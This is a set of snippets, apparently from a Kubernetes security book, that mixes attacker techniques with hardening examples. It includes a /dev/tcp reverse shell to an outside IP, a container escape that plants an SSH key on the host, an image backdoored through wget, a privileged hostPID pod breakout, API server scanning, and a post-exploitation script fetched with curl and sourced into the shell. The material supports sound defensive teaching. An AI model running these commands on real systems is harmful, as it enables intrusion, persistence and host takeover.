["```\nrevshell() {\n    local TARGET_IP=\"${1:-123.123.123.123}\";\n    local TARGET_PORT=\"${2:-1234}\";\n    while :; do\n        nohup bash -i &> \\\n          /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1;\n        sleep 1;\n    done\n}\n```", "```\nandy@k8s-node-x:~ [0]$ docker ps --format '{{.Image}} {{.Names}}' |\n  grep \"sublimino-\"\nbusybox k8s_alpine_sublimino-frontend-5cc74f44b8-4z86v_default-0\nk8s.gcr.io/pause:3.3 k8s_POD_sublimino-frontend-5cc74f44b8-4z86v-1\n...\nbusybox k8s_alpine_sublimino-microservice-755d97b46b-xqrw9_default_0\nk8s.gcr.io/pause:3.3 k8s_POD_sublimino-microservice-755d97b46b-xqrw9_default_1\n...\nbusybox k8s_alpine_sublimino-frontend-5cc74f44b8-hnxz5_default_0\nk8s.gcr.io/pause:3.3 k8s_POD_sublimino-frontend-5cc74f44b8-hnxz5_default_1\n```", "```\napiVersion: v1\nkind: Pod\nmetadata:\n  name: security-context-demo\nspec:\n  securityContext:\n    runAsUser: 1000\n    runAsGroup: 3000\n    fsGroup: 2000\n  containers:\n  - name: sec-ctx-demo\n# ...\n    securityContext:\n      allowPrivilegeEscalation: false\n# ...\n```", "```\n# inside a privileged container\nroot@hack:~ [0]$ ls -lasp /dev/\nroot@hack:~ [0]$ mount /dev/xvda1 /mnt/\n\n# write into host filesystem's /root/.ssh/ folder\nroot@hack:~ [0]$ cat MY_PUB_KEY >> /mnt/root/.ssh/authorized_keys\n```", "```\nkubectl create -f \\\n\"https://raw.githubusercontent.com/GoogleCloudPlatform/\\\nmicroservices-demo/master/release/kubernetes-manifests.yaml\"\n```", "```\napiVersion: v1\nkind: Pod\n```", "```\nmetadata:\n  annotations:\n    seccomp.security.alpha.kubernetes.io/pod: runtime/default\n    cni.projectcalico.org/podIP: 192.168.155.130/32\n    cni.projectcalico.org/podIPs: 192.168.155.130/32\n    sidecar.istio.io/rewriteAppHTTPProbers: \"true\"\n```", "```\nmetadata:\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/hello: \"localhost/\\\n      k8s-apparmor-example-deny-write\"\n```", "```\nsecurityContext:\n  seccompProfile:\n    type: Localhost\n    localhostProfile: my-seccomp-profile.json\n```", "```\n  creationTimestamp: \"2021-05-29T11:20:53Z\"\n```", "```\n  labels:\n    app: frontend\n    type: redis\n```", "```\n  managedFields:\n  - apiVersion: v1\n    fieldsType: FieldsV1\n    fieldsV1:\n      f:metadata:\n        f:annotations:\n          .: {}\n          f:sidecar.istio.io/rewriteAppHTTPProbers: {}\n# ...\n      f:spec:\n        f:containers:\n          k:{\"name\":\"server\"}:\n# ...\n            f:image: {}\n            f:imagePullPolicy: {}\n            f:livenessProbe:\n# ...\n```", "```\n  name: frontend-6b887d8db5-xhkmw\n  namespace: default\n```", "```\n$ grep -o \"search [^ ]*\" /etc/resolv.conf\nsearch secret-namespace.svc.cluster.local\n```", "```\nspec:\n  containers:\n  - env:\n    - name: PORT\n      value: \"8080\"\n    - name: CURRENCY_SERVICE_ADDR\n      value: currencyservice:7000\n    - name: SHIPPING_SERVICE_ADDR\n      value: shippingservice:50051\n# These environment variables should be set in secrets\n    - name: DATABASE_ADDR\n      value: postgres:5432\n    - name: DATABASE_USER\n      value: secret_user_name\n    - name: DATABASE_PASSWORD\n      value: the_secret_password\n    - name: DATABASE_NAME\n      value: users\n# This is a safer way to reference secrets and configuration\n    - name: MY_SECRET_FILE\n      value: /mnt/secrets/foo.toml\n```", "```\n  image: gcr.io/google-samples/microservices-demo/frontend:v0.2.3\n```", "```\n  image: gcr.io/google-samples/microservices-demo/frontend@sha256:ca5d97b6cec...\n```", "```\ncontrolplane/bizcard:latest\\ ![1](Images/1.png)\n@sha256:649f3a84b95ee84c86d70d50f42c6d43ce98099c927f49542c1eb85093953875 ![2](Images/2.png)\n```", "```\n$ docker run -it --cidfile=cidfile --entrypoint /bin/busybox \\\n  gcr.io/google-samples/microservices-demo/frontend:v0.2.3 \\\n  wget https://securi.fyi/b4shd00r -O /bin/sh ![1](Images/1.png)\n\n$ docker commit $(<cidfile) \\\n  gcr.io/google-samples/microservices-demo/frontend:v0.2.3 ![2](Images/2.png)\n```", "```\n  imagePullPolicy: Always\n```", "```\napiVersion : v1\nkind : Pod\n# ...\nlivenessProbe:\n  httpGet:\n    host: 172.31.6.71\n    path: /\n    port: 8000\n    httpHeaders :\n    - name: Custom-Header\n      value: Awesome\n```", "```\n    resources:\n      limits:\n        cpu: 200m\n        memory: 128Mi\n      requests:\n        cpu: 100m\n        memory: 64Mi\n```", "```\nroot@hack-3-fc58fe02:/ [0]# dig +noall +answer \\\n  srv any.any.svc.cluster.local |\n  sort --human-numeric-sort --key 7\n\nany.any.svc.cluster.local. 30 IN SRV 0 6 53 kube-dns.kube-system.svc.cluster...\nany.any.svc.cluster.local. 30 IN SRV 0 6 80 frontend-external.default.svc.clu...\nany.any.svc.cluster.local. 30 IN SRV 0 6 80 frontend.default.svc.cluster.local.\n...\n```", "```\nroot@hack-3-fc58fe02:/ [0]# dig +noall +answer \\\n  srv any.any.any.svc.cluster.local |\n  sort --human-numeric-sort --key 7\n\nany.any.any.svc.cluster.local. 30 IN SRV 0 3 53 192-168-155-129.kube-dns.kube...\nany.any.any.svc.cluster.local. 30 IN SRV 0 3 53 192-168-156-130.kube-dns.kube...\nany.any.any.svc.cluster.local. 30 IN SRV 0 3 3550 192-168-156-133.productcata...\n...\n```", "```\nroot@hack-3-fc58fe02:/ [0]# dig +noall +answer 1-3-3-7.default.pod.cluster.local\n\n1-3-3-7.default.pod.cluster.local. 23 IN A      1.3.3.7\n```", "```\nroot@test-pd:~ [0]# env | grep KUBE\nKUBERNETES_SERVICE_PORT_HTTPS=443\nKUBERNETES_SERVICE_PORT=443\nKUBERNETES_PORT_443_TCP=tcp://10.7.240.1:443\nKUBERNETES_PORT_443_TCP_PROTO=tcp\nKUBERNETES_PORT_443_TCP_ADDR=10.7.240.1\nKUBERNETES_SERVICE_HOST=10.7.240.1\nKUBERNETES_PORT=tcp://10.7.240.1:443\nKUBERNETES_PORT_443_TCP_PORT=443\n\nroot@test-pd:~ [0]# curl -k \\\n  https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version\n\n{\n  \"major\": \"1\",\n  \"minor\": \"19+\",\n  \"gitVersion\": \"v1.19.9-gke.1900\",\n  \"gitCommit\": \"008fd38bf3dc201bebdd4fe26edf9bf87478309a\",\n# ...\n```", "```\nnmap-kube-apiserver() {\n    local REGEX=\"major.*gitVersion.*buildDate\"\n    local ARGS=\"${@:-$(kubectl config view --minify |\n        awk '/server:/{print $2}' |\n        sed -E -e 's,^https?://,,' -e 's,:, -p ,g')}\"\n\n    nmap \\\n        --open \\\n        --script=http-get \\\n        --script-args \"\\\n http-get.path=/version, \\\n http-get.match=\"${REGEX}\", \\\n http-get.showResponse, \\\n http-get.forceTls \\\n \" \\\n        ${ARGS}\n}\n```", "```\n  securityContext: {}\n```", "```\n  serviceAccount: default\n  serviceAccountName: default\n```", "```\n  schedulerName: default-scheduler\n  tolerations:\n  - effect: NoExecute\n    key: node.kubernetes.io/not-ready\n    operator: Exists\n    tolerationSeconds: 300\n  - effect: NoExecute\n    key: node.kubernetes.io/unreachable\n    operator: Exists\n    tolerationSeconds: 300\n```", "```\n  volumes:\n  - name: kube-api-access-p282h\n    projected:\n      defaultMode: 420\n      sources:\n      - serviceAccountToken:\n          expirationSeconds: 3600\n          path: token\n      - configMap:\n          items:\n          - key: ca.crt\n            path: ca.crt\n          name: kube-root-ca.crt\n      - downwardAPI:\n          items:\n          - fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n            path: namespace\n```", "```\nstatus:\n  hostIP: 10.0.1.3\n  phase: Running\n  podIP: 192.168.155.130\n  podIPs:\n  - ip: 192.168.155.130\n```", "```\n  securityContext:\n    seccompProfile:\n      type: Localhost\n      localhostProfile: profiles/fine-grained.json\n```", "```\nannotations:\n  container.apparmor.security.beta.kubernetes.io/hello: localhost/k8s-apparmor-example-deny-write\n\n```", "```\nspec:\n  containers:\n  - image: controlplane/hack\n    securityContext:\n      allowPrivilegeEscalation: false\n```", "```\n\n$ cat <<EOF > kubesec-test.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n name: kubesec-demo\nspec:\n containers:\n - name: kubesec-demo\n image: gcr.io/google-samples/node-hello:1.0\n securityContext:\n readOnlyRootFilesystem: true\nEOF\n\n$ docker run -i kubesec/kubesec:2.11.1 scan - < kubesec-test.yaml\n[ {\n \"object\": \"Pod/kubesec-demo.default\",\n \"valid\": true,\n \"fileName\": \"STDIN\",\n \"message\": \"Passed with a score of 1 points\",\n \"score\": 1,\n \"scoring\": {\n   \"passed\": [{\n      \"id\": \"ReadOnlyRootFilesystem\",\n        \"selector\": \"containers[].securityContext.readOnlyRootFilesystem == true\",\n        \"reason\": \"An immutable root filesystem can ... increase attack cost\",\n        \"points\": 1\n        }\n    ],\n    \"advise\": [{\n      \"id\": \"ApparmorAny\",\n      \"selector\": \".metadata.annotations.container.apparmor.security.beta.kubernetes.io/nginx\",\n      \"reason\": \"Well defined AppArmor ... WARNING: NOT PRODUCTION READY\",\n      \"points\": 3\n    },\n...\n\n```", "```\nuser@host $ OVERRIDES='{\"spec\":{\"hostPID\": true,''\"containers\":[{\"name\":\"1\",' user@host $ OVERRIDES+='\"image\":\"alpine\",\"command\":[\"/bin/ash\"],''\"stdin\": true,' user@host $ OVERRIDES+='\"tty\":true,\"imagePullPolicy\":\"IfNotPresent\",' user@host $ OVERRIDES+='\"securityContext\":{\"privileged\":true}}]}}' \nuser@host $ kubectl run privileged-and-hostpid --restart=Never -it --rm \\\n --image noop --overrides \"${OVERRIDES}\" ![1](Images/1.png)\n\n/ # grep PRETTY_NAME /etc/*release* ![2](Images/2.png)\nPRETTY_NAME=\"Alpine Linux v3.14\" \n/ # ps faux | head ![3](Images/3.png)\nPID   USER     TIME  COMMAND\n 1 root      0:07 /usr/lib/systemd/systemd noresume noswap cros_efi 2 root      0:00 [kthreadd] 3 root      0:00 [rcu_gp] 4 root      0:00 [rcu_par_gp] 6 root      0:00 [kworker/0:0H-kb] 9 root      0:00 [mm_percpu_wq] 10 root      0:00 [ksoftirqd/0] 11 root      1:33 [rcu_sched] 12 root      0:00 [migration/0] \n/ # grep PRETTY_NAME /proc/1/root/etc/*release ![4](Images/4.png)\n/proc/1/root/etc/os-release:PRETTY_NAME=\"Container-Optimized OS from Google\"\n```", "```\n/ $ grep PRETTY_NAME /proc/1/root/etc/*release*\ngrep: /proc/1/root/etc/*release*: Permission denied\n```", "```\nroot@r00t:/tmp [0]# source <(curl -s \\\n  https://raw.githubusercontent.com/redcode-labs/Bashark/master/bashark.sh)\n\n__________               .__                  __               ________     _______\n\\______   \\_____    _____|  |__ _____ _______|  | __ ___  __   \\_____  \\    \\   _  \\\n |    |  _/\\__  \\  /  ___/  |  \\\\__  \\\\_  __ \\  |/ / \\  \\/ /    /  ____/    /  /_\\  \\\n |    |   \\ / __ \\_\\___ \\|   Y  \\/ __ \\|  | \\/    <   \\   /    /       \\    \\  \\_/   \\\n |______  /(____  /____  >___|  (____  /__|  |__|_ \\   \\_/ /\\  \\_______ \\ /\\ \\_____  /\n        \\/      \\/     \\/     \\/     \\/           \\/       \\/          \\/ \\/       \\/\n\n[*] Type 'help' to show available commands\n\nbashark_2.0$\n\n```"]